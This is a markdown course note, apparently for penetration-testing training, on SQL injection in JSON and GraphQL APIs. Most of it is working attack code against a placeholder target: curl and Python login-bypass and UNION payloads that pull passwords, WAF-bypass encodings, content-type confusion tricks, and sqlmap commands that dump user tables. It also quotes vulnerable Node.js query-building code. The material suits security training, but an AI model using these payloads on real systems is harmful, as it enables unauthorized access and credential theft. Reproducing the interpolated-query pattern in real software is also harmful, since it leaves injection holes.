---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.12 SQLi in JSON APIs"
---

# 06.12 — SQLi in JSON APIs

## JSON APIs and SQL Injection

REST APIs that accept JSON bodies are still vulnerable to SQL injection if the JSON values are used in SQL queries without parameterization. The injection technique is the same — only the format of the request changes.

```
CLASSIC FORM POST:
  POST /login
  username=admin&password=secret
  
JSON API POST:
  POST /api/auth
  Content-Type: application/json
  {"username":"admin","password":"secret"}
  
BOTH USE SAME SQL:
  SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
  → Both equally injectable!
```

---

## Anatomy of JSON SQLi

```bash
# VULNERABLE SERVER CODE (Node.js example):
# const { username, password } = req.body;
# const sql = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
# db.query(sql, (err, result) => { ... });

# NORMAL REQUEST:
curl -X POST https://target.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"secret"}'

# INJECT SINGLE QUOTE:
curl -X POST https://target.com/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'","password":"secret"}'
# → JSON sends: {"username":"admin'","password":"secret"}
# → SQL error? → SQLi confirmed!

# CLEAN WAY TO WRITE JSON PAYLOADS:
# Use Python for complex payloads:
python3 -c "
import requests, json
r = requests.post('https://target.com/api/auth',
    json={'username': \"admin'\", 'password': 'x'},
    headers={'Content-Type': 'application/json'})
print(r.status_code, r.text[:200])
"
```

---

## Login Bypass via JSON

```bash
# STANDARD LOGIN BYPASS:
# payload in JSON:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'

# PYTHON (cleaner):
python3 -c "
import requests
r = requests.post('https://target.com/api/login',
    json={'username': \"admin'--\", 'password': 'x'})
print(r.json())
"

# ALWAYS TRUE PAYLOAD:
python3 -c "
import requests
payloads = [
    {\"username\": \"' OR 1=1--\", \"password\": \"x\"},
    {\"username\": \"' OR '1'='1\", \"password\": \"' OR '1'='1\"},
    {\"username\": \"admin\", \"password\": \"' OR 1=1--\"},
]
for p in payloads:
    r = requests.post('https://target.com/api/login', json=p)
    print(p['username'], '→', r.status_code, r.text[:100])
"
```

---

## JSON Field Injection Patterns

```python
import requests

BASE = "https://target.com/api"

# NUMERIC JSON FIELD:
# {"id": 1} → SELECT * FROM products WHERE id = 1
r = requests.post(f"{BASE}/product", json={"id": "1 OR 1=1--"})
# OR: send as string instead of int

# ARRAY FIELD INJECTION:
# {"ids": [1, 2, 3]} → SELECT * FROM products WHERE id IN (1,2,3)
r = requests.post(f"{BASE}/products", json={"ids": [1, "2 UNION SELECT password FROM users--"]})

# NESTED JSON:
# {"user": {"id": 1, "role": "user"}} → checks user.role
r = requests.post(f"{BASE}/data", json={"user": {"id": 1, "role": "admin'--"}})

# SEARCH FIELD:
r = requests.post(f"{BASE}/search", json={"query": "test' UNION SELECT username,password,3 FROM users--"})

# FILTER FIELD:
r = requests.post(f"{BASE}/filter", json={"status": "active' OR '1'='1"})

# SORT FIELD:
r = requests.post(f"{BASE}/list", json={"sort": "name; SELECT SLEEP(5)--"})
```

---

## JSON-Specific WAF Bypass Tricks

Some WAFs scan the JSON body but miss certain encoding tricks:

```python
import requests

# UNICODE QUOTE (WAF may not decode '):
r = requests.post("https://target.com/api/login",
    headers={"Content-Type": "application/json"},
    data='{"username":"admin\\u0027--","password":"x"}')  # ' = '

# JSON UNICODE ESCAPE:
r = requests.post("https://target.com/api/login",
    headers={"Content-Type": "application/json"},
    data='{"username":"admin’--","password":"x"}')  # right single quotation mark

# HTTP PARAMETER POLLUTION WITH JSON:
# Some servers parse both JSON and form params
r = requests.post("https://target.com/api/login?username=admin",
    json={"username": "hacker", "password": "x"})

# CONTENT-TYPE CONFUSION:
# Server parses as JSON even with wrong content-type
r = requests.post("https://target.com/api/login",
    headers={"Content-Type": "text/plain"},
    data='{"username":"admin\'--","password":"x"}')
```

---

## GraphQL Injection

GraphQL APIs use JSON-like query language — also injectable:

```bash
# GRAPHQL QUERY:
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { username email } }"}'

# GRAPHQL SQLi (if underlying resolver uses SQL):
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: \"1 OR 1=1--\") { username email } }"}'

# GRAPHQL INTROSPECTION (get all types/queries):
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# GRAPHQL WITH MUTATION:
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { login(username: \"admin'\''--\", password: \"x\") { token } }"}'
```

---

## SQLMap with JSON APIs

```bash
# SQLMAP JSON DETECTION:
sqlmap -u "https://target.com/api/user" \
  --data='{"id":"1"}' \
  -H "Content-Type: application/json"

# SPECIFY PARAMETER:
sqlmap -u "https://target.com/api/user" \
  --data='{"id":"1","name":"test"}' \
  -H "Content-Type: application/json" \
  -p id

# NESTED JSON (use * to mark injection point):
sqlmap -u "https://target.com/api/user" \
  --data='{"user":{"id":"1*"}}' \
  -H "Content-Type: application/json"

# ARRAY FIELD:
sqlmap -u "https://target.com/api/users" \
  --data='{"ids":["1*"]}' \
  -H "Content-Type: application/json"

# FROM BURP REQUEST:
# Capture JSON request in Burp → Save → feed to sqlmap
sqlmap -r json_request.txt

# DUMP:
sqlmap -u "https://target.com/api/user" \
  --data='{"id":"1"}' \
  -H "Content-Type: application/json" \
  --dump -D myapp -T users
```

---

## Detecting API Format

```bash
# DETERMINE IF API ACCEPTS JSON:
# Look at Content-Type in request and response:
curl -sI -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"test":"x"}' | grep -i "content-type"

# TRY BOTH FORMATS:
# Form data:
curl -X POST https://target.com/api/login \
  -d "username=admin&password=x"

# JSON:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"x"}'

# SOME SERVERS ACCEPT BOTH — test both!
# Parser confusion: send JSON body with form Content-Type → server may parse as JSON!
curl -X POST https://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"username":"admin'"'"'--","password":"x"}'
```

---

## Related Notes
- [[10 - SQLi in POST Body]] — general POST injection
- [[11 - SQLi in HTTP Headers]] — header injection
- [[Module 07 - API Security]] — full API security testing
- [[19 - Content-Type header]] — Content-Type switching attacks
- [[21 - sqlmap Full Usage Guide]] — sqlmap with JSON APIs
